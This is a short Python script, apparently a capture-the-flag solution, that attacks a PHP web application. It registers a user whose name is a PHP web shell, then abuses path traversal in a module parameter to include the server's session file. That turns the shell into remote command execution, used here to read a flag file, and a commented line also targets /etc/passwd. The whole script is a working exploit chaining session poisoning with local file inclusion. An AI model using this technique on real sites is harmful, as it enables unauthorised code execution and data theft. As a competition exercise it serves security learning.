url = 'http://edu.kaibro.tw:8888/'
import requests
evil_code = '<?php system($_GET[OAO]);?>'
post_data = {
	'user' : evil_code
}
payload = {
	'action' : 'register'
}
res = requests.post(url,params=payload,data=post_data)
cookies =res.cookies
'''
On Ubuntu or Debian machines, if session.save_path is not set, then session files are saved in /var/lib/php5.
On RHEL and CentOS systems, if session.save_path is not set, session files will be saved in /var/lib/php/session
'''
print(cookies)
payload = {
	'action': 'module', 
	'm': '../'*10+'var/lib/php/session/sess_'+cookies['PHPSESSID'],
	# 'm' : '../'*10 + 'etc/passwd',
	'OAO' : 'cat /flag-66666666666'
}
res = requests.get(url, params=payload,cookies=cookies).content.decode()
idx = res.find('</code>')
res = res[idx+7:]
print(res)